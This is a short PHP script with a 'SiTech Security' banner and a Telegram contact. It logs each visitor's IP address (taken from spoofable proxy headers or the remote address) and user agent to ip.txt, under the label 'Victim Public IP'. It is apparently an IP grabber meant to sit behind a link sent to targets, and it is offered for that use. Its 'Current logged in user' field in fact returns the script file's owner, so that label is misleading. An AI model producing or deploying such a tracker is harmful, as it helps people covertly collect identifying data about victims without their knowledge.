<?php

# ____  _ _____         _       ____                       _ _
#/ ___|(_)_   _|__  ___| |__   / ___|  ___  ___ _   _ _ __(_) |_ _   _
#\___ \| | | |/ _ \/ __| '_ \  \___ \ / _ \/ __| | | | '__| | __| | | |
# ___) | | | |  __/ (__| | | |  ___) |  __/ (__| |_| | |  | | |_| |_| |
#|____/|_| |_|\___|\___|_| |_| |____/ \___|\___|\__,_|_|  |_|\__|\__, |
#                                                                |___/
#        By awpsn Contact me via Telegram: https://t.me/awpsn

if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check if ip is pass from proxy
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }

$browser = $_SERVER['HTTP_USER_AGENT'];
$useragent = "User-Agent: " . $browser;

$user = get_current_user(); 

$file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
$victim = "\r\n"."Victim Public IP: " . $ipaddress;

$currentuser = "\r\n" . "\r\n" . "Current logged in user: " . $user ."\r\n";

$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $useragent);
fwrite($fp, $currentuser);


fclose($fp);
